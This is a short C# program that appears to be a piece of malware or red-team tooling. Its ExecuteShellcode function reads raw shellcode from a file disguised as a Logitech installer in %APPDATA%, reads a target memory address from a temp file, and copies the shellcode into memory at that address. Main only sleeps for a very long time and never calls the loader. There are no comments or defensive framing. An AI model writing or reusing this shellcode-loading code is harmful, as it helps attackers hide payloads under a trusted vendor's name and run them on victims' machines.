using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace TestCSharp
{
    internal class Program
    {
        static void ExecuteShellcode()
        {
            string shellcodePath = Environment.ExpandEnvironmentVariables("%APPDATA%\\Logitech\\installer.dat");
            StreamReader reader = new StreamReader(Environment.ExpandEnvironmentVariables("%TEMP%\\temp.txt"));
            IntPtr allocationAddr = new IntPtr(Convert.ToInt64(reader.ReadToEnd()));
            reader.Close();
            byte[] shellcode = File.ReadAllBytes(shellcodePath);
            Marshal.Copy(shellcode, 0, allocationAddr, shellcode.Length);
        }

        static void Main(string[] args)
        {
            System.Threading.Thread.Sleep(1000000000);
            return;
        }
    }
}
